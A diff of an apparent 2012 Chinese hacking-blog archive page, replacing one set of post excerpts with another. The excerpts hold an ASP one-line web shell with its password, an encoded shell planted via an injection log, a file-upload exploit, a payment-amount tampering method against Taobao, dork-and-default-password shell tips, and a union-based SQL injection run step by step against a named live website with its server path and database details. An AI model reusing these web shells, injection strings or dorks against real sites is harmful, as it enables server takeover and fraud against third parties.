@@ -45,29 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T07:08:33.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-07-02T07:59:05.000Z" itemprop="datePublished">
+          2012-07-02
       </time>
     
     
     | 
-    <a href='/tag/速成建站/'>速成建站</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/通杀漏洞/'>通杀漏洞</a>
+    <a href='/tag/post/'>post</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/430.seo/">速成建站通杀漏洞：文件上传导致任意代码执行，直接秒杀服务器</a></h2>
+      <h2 class="post-title"><a href="/619.seo/">淘宝网某处存在严重支付漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><b>漏洞详情</b><b></b></p><br><p>披露状态：<b></b></p><br><p>2012-05-17： 积极联系厂商并且等待厂商认领中，细节不对外公开   <br />2012-05-17： 厂商已经主动忽略漏洞，细节向公众公开</p><br><p>简要描述：</p><br><p>程序设计上失误 没有完全判断上传后缀！</p><br><p>详细说明：</p><br><p>速成建站通杀漏洞，直接秒杀服务器！进去直接mysql最高权限 ！危害这个你懂滴！</p><br><p>漏洞证明：</p><br><p><a href="http://my.5uweb.com/coon.asp">http://my.5uweb.com/coon.asp</a>   <br />服务器咱就不进了！！河蟹啊！</p><br><p>
+        <p>转自乌云<a href="http://www.wooyun.org/bugs/wooyun-2010-07293">http://www.wooyun.org/bugs/wooyun-2010-07293</a></p>  <p>漏洞详情</p>  <p>披露状态：</p>  <p>2012-05-18： 细节已通知厂商并且等待厂商处理中   <br />2012-05-18： 厂商已经确认，细节仅向厂商公开    <br />2012-05-28： 细节向核心白帽子及相关领域专家公开    <br />2012-06-07： 细节向普通白帽子公开    <br />2012-06-17： 细节向实习白帽子公开    <br />2012-07-02： 细节向公众公开</p>  <p>简要描述：</p>  <p>淘宝网某处存在支付漏洞，未使用SSL加密支付过程，同时，对支付过程相关代码的审计存在一定缺陷，导致漏洞产生。会导致允许用户对支付金额进行修改，给厂商带来很大的利益损失。</p>  <p>详细说明：</p>  <p>在阿里旺旺2012中，使用短信旺旺中心对短信条数进行充值，在该过程中，未使用SSL安全连接，同时存在支付漏洞。   <br />选择充值的金额后，下一步，使用<a href="http://ha.cker.in/tag/Fiddler" target="_blank">Fiddler</a>截取数据包，GBK编码，修改POST数据中的数据，seriesPrice为支付的金额，seriesNum为充值的条数，这两个地方理论上都可以进行修改，这里以修改seriesPrice为例。</p>  <p>漏洞证明：</p>  <p>充值前截图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/bdc6a26da239_15137/clip_image001.jpg" width="532" height="443" /></p>
       
       </p>
       
       <p>
-          <a href="/430.seo/" class="excerpt-link">Read More...</a>
+          <a href="/619.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,27 +76,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T06:36:10.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-07-02T06:06:45.000Z" itemprop="datePublished">
+          2012-07-02
       </time>
     
     
     | 
-    <a href='/tag/SQL通用防注入系统asp版漏洞/'>SQL通用防注入系统asp版漏洞</a>
+    <a href='/tag/拿shell/'>拿shell</a>,
+    
+    <a href='/tag/突破星外/'>突破星外</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/428.seo/">SQL通用防注入系统asp版漏洞</a></h2>
+      <h2 class="post-title"><a href="/616.seo/">关于后台只读备份拿shell</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        今晚群里朋友叫看个站，有sql防注入，绕不过，但是有发现记录wrong的文件sqlin.asp。   既然做了记录，再查看了下它的记录文件    于是想着构造个asp一句话写进去，前面几种没加密的都失败了，于是写了个加密的   &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ┼攠數畣整爠煥敵瑳∨≡┩愾&#160;&#160;&#160;&#160;&#
+        <p>今天在旁注一个站点的过程中遇到了一个十分有意思的站,拿出来跟大家分享下.&#160; 小菜文章没技术含量大牛路过    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; margin-left: 0px; border-top: 0px; margin-right: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/shell_14827/clip_image001.jpg" width="590" height="364" />这是这个站的后台用 账号admin密码admin进去以后发现里面是精良的框架搭建的</p>
       
       </p>
       
       <p>
-          <a href="/428.seo/" class="excerpt-link">Read More...</a>
+          <a href="/616.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -105,31 +107,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T06:34:04.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-06-28T07:52:56.000Z" itemprop="datePublished">
+          2012-06-28
       </time>
     
     
     | 
-    <a href='/tag/菜刀/'>菜刀</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/一句话/'>一句话</a>,
+    <a href='/tag/sinopass/'>sinopass</a>,
     
-    <a href='/tag/护卫神/'>护卫神</a>
+    <a href='/tag/后台/'>后台</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/425.seo/">突破护卫神的菜刀一句话 & 一句话变形处理</a></h2>
+      <h2 class="post-title"><a href="/614.seo/">sinopass后台管理系统漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;    <br />asp的&#160; 密码为x</p>
+        无意中发现：   关键词：inurl:About.asp?i_type=   自己尝试了一下&#160; 基本上都是的   后台：admin/login.asp&#160; 或者manage   拿shell方法:数据库备份&#160; 或者ewebeditor   有ewebeditor默认路径&#160; 默认数据库的&#160; 后台帐号密码可以注入&#160; 注入漏洞蛮多的 添加字段 a_name a_pass
       
       </p>
       
       <p>
-          <a href="/425.seo/" class="excerpt-link">Read More...</a>
+          <a href="/614.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -138,29 +140,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-09T17:54:24.000Z" itemprop="datePublished">
-          2012-05-10
+      <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">
+          2012-06-28
       </time>
     
     
     | 
-    <a href='/tag/VMware/'>VMware</a>,
-    
-    <a href='/tag/虚拟机/'>虚拟机</a>
+    <a href='/tag/渗透/'>渗透</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/422.seo/">虚拟机报错：【无法打开内核设备"\\.\VMCIDev\VMX"  系统找不到指定的文件】的解决办法</a></h2>
+      <h2 class="post-title"><a href="/611.seo/">记新手的一次渗透入侵</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>刚在xp上安装VMWare8.0.3，新建虚拟机出现这种错误：</p>  <p>无法打开内核设备“\.\VMCIDev\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗? </p>  <p>打开模块DevicePowerOn电源失败。</p>
+        <p><table border="0" cellspacing="0" cellpadding="0"><tbody>     <tr>       <td>         <p>一年前把，<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a><b></b>了，这次发现不是root，但帐户支持load_file()            <br />Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            <br />Ps：我从一开始写文章到现在，不屏蔽<b>渗透</b>的地址连接，主要的原因还是希望            <br />大家可以通过我的文章，真正实践性滴学习本文内容，新人朋友可以一步步滴实践操作            <br />【懒得扯淡了，希望大家那个什么什么什么，你们懂的，人品很重要】            <br /><a href="http://www.czxtaiji.net/content.php?theMenuId=4&amp;theSubMenuId=1&amp;theArticleId=48%20and%201=2">http://www.czxtaiji.net/content. … leId=48%20and%201=2</a>            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 947            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 948            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 949            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 950            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 951            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 952            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 953            <br />获取到路径：d:\czxsite\bin\sys\config.php            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0a82505b9f50_14E77/clip_image002.jpg" width="604" height="316" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=48 order by 9            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0a82505b9f50_14E77/clip_image004.jpg" width="604" height="240" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,5,6,7,8,9            <br />Warning: disparticlecontent(7): failed to open stream: No such file or directory in d:\czxsite\bin\sys\config.php on line 976            <br />Warning: disparticlecontent(): Failed opening ‘7’ for inclusion (include_path=’.;c:\php4\pear’) in d:\czxsite\bin\sys\config.php on line 976            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,user(),database(),7,8,version()            <br />user():czxtaiji@localhost            <br />version():4.0.18-nt&#160;&#160; <br />database():czxtaiji            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0a82505b9f50_14E77/clip_image006.jpg" width="604" height="237" /></p>       </td>     </tr>   </tbody></table>
       
       </p>
       
       <p>
-          <a href="/422.seo/" class="excerpt-link">Read More...</a>
+          <a href="/611.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -169,27 +169,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-04T07:03:33.000Z" itemprop="datePublished">
-          2012-05-04
+      <time datetime="2012-06-28T07:38:55.000Z" itemprop="datePublished">
+          2012-06-28
       </time>
     
     
     | 
-    <a href='/tag/SQL-Injection/'>SQL Injection</a>
+    <a href='/tag/网络安全/'>网络安全</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/419.seo/">拍客piikee竞拍网站源码全局sql injection</a></h2>
+      <h2 class="post-title"><a href="/609.seo/">某大型企业局域网安全解决方案</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>主题:拍客piikee竞拍网站源码全局sql injection   <br />作者:piaoye    <br />版权:3EST信息安全团队 (<a href="http://www.3est.com" target="_blank">www.3est.com</a>) </p>  <p>0x01 简介   <br />在乌云看以快拍拍网站充值BUG，就搜索了下这个网站，谷歌里有个类似的网站，程序注射一堆,然后就进去了。    <br />0x02 配置并编译    <br />php+mysql    <br />0x03 实战应用    <br />为什么说2B那？前台所有文件参数值都这样来的，大家看下这段代码</p>  <p>   <br />news_arc.php    <br />&lt;?php    <br />define(‘IN_JP’,true);    <br />require_once(&quot;./config/init.php&quot;); </p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $arcid = $_REQUEST[&quot;arcid&quot;];   <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($arcid!=&quot;&quot;){    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $qrynews2 = &quot;select <em> from news where id = &quot;.$arcid;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objnews2=$GLOBALS[‘db’]-&gt;get_one($qrynews2);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; }else{    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objnews2=&quot;&quot;;    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; } </p>  <p>&#160; $qrycount = &quot;select w.id,r.username,w.won_date,p.name,a.auc_final_price,a.auctionID,p.picture1,p.price,(100-100</em>a.auc_final_price/p.price) as discount,a.auctionID from won_auctions w left join auction a on w.auction_id=a.auctionID left join products p on a.productID=p.productID inner join registration r on w.userid = r.id where w.userid&gt;=0 order by w.won_date desc limit 0,7 &quot;;&#160; <br />&#160; $obj1 = $GLOBALS[‘db’]-&gt;select($qrycount); </p>  <p>$smarty-&gt;assign(&quot;obj1&quot;,$obj1);   <br />$smarty-&gt;assign(&quot;objnews2&quot;,$objnews2);    <br />$smarty-&gt;display(‘news_arc.htm’);    <br />?&gt;    <br /></p>
+        <p>第一章 总则 </p>  <p>本方案为某大型局域网<a href="http://ha.cker.in/tag/网络安全" target="_blank">网络安全</a>解决方案，包括原有网络系统分析、安全需求分析、安全目标的确立、安全体系结构的设计、等。本安全解决方案的目标是在不影响某大型企业局域网当前业务的前提下，实现对他们局域网全面的安全管理。 </p>  <p>1.将安全策略、硬件及软件等方法结合起来，构成一个统一的防御系统，有效阻止非法用户进入网络，减少网络的安全风险。    <br />2.定期进行漏洞扫描，审计跟踪，及时发现问题，解决问题。     <br />3.通过入侵检测等方式实现实时安全监控，提供快速响应故障的手段，同时具备很好的安全取证措施。     <br />4.使网络管理者能够很快重新组织被破坏了的文件或应用。使系统重新恢复到破坏前的状态，最大限度地减少损失。     <br />5.在工作站、服务器上安装相应的防病毒软件，由中央控制台统一控制和管理，实现全网统一防病毒。 </p>  <p>第二章 网络系统概况 </p>  <p>2.1 、网络概况    <br />这个企业的局域网是一个信息点较为密集的千兆局域网络系统，它所联接的现有上千个信息点为在整个企业内办公的各部门提供了一个快速、方便的信息交流平台。不仅如此，通过专线与Internet的连接，打通了一扇通向外部世界的窗户，各个部门可以直接与互联网用户进行交流、查询资料等。通过公开服务器，企业可以直接对外发布信息或者发送电子邮件。高速交换技术的采用、灵活的网络互连方案设计为用户提供快速、方便、灵活通信平台的同时，也为网络的安全带来了更大的风险。因此，在原有网络上实施一套完整、可操作的安全解决方案不仅是可行的，而且是必需的。 </p>  <p>2.1.1 、网络概述 </p>  <p>这个企业的局域网，物理跨度不大，通过千兆交换机在主干网络上提供1000M的独享带宽，通过下级交换机与各部门的工作站和服务器连结，并为之提供100M的独享带宽。利用与中心交换机连结的Cisco 路由器，所有用户可直接访问Internet。 </p>  <p>2.1.2 、网络结构 </p>  <p>这个企业的局域网按访问区域可以划分为三个主要的区域：Internet区域、内部网络、公开服务器区域。内部网络又可按照所属的部门、职能、安全重要程度分为许多子网，包括：财务子网、领导子网、办公子网、市场部子网、中心服务器子网等。在安全方案设计中，我们基于安全的重要程度和要保护的对象，可以在Catalyst 型交换机上直接划分四个虚拟局域网（VLAN），即：中心服务器子网、财务子网、领导子网、其他子网。不同的局域网分属不同的广播域，由于财务子网、领导子网、中心服务器子网属于重要网段，因此在中心交换机上将这些网段各自划分为一个独立的广播域，而将其他的工作站划分在一个相同的网段。（图省略） </p>
       
       </p>
       
       <p>
-          <a href="/419.seo/" class="excerpt-link">Read More...</a>
+          <a href="/609.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -198,27 +198,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-04-23T06:33:30.000Z" itemprop="datePublished">
-          2012-04-23
+      <time datetime="2012-06-25T06:39:29.000Z" itemprop="datePublished">
+          2012-06-25
       </time>
     
     
     | 
-    <a href='/tag/记事狗/'>记事狗</a>
+    <a href='/tag/xss/'>xss</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/405.seo/">记事狗设计缺陷导致可以删除网站任意图片</a></h2>
+      <h2 class="post-title"><a href="/603.seo/">xss的发现与利用</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-         路径处理不当导致注册用户可以删除网站上的任意图片 详细说明： 注册一个用户，登录后点击上传头像，比如地址为： http://www.badguest.cn /jishigou30s/index.php?mod=settings&amp;code=face 在最后面加上&amp;temp_face=././images/noavatar.gif 再访问，然后我的头像那块就会加载这个图片，直接点击下面的“确认”，头像木有修改成功，但是no
+        <p>xss老生常谈了xss的发现也是有一些技巧的，这里介绍一种。   <br />很多人习惯是直接输入一些特殊字符进行判断，其实吧，在你发送的时候抓一下包看下会有惊喜哦！    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/xss_13E92/clip_image002.jpg" width="604" height="460" /> </p>
       
       </p>
       
       <p>
-          <a href="/405.seo/" class="excerpt-link">Read More...</a>
+          <a href="/603.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -226,7 +226,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/2012/page/21/">← Newer Posts</a>
-    <span class="page-number">Page 22 of 29</span>
+    <span class="page-number">Page 22 of 40</span>
     <a class="older-posts" href="/archives/2012/page/23/">Older Posts →</a>
   </nav>
 </main>
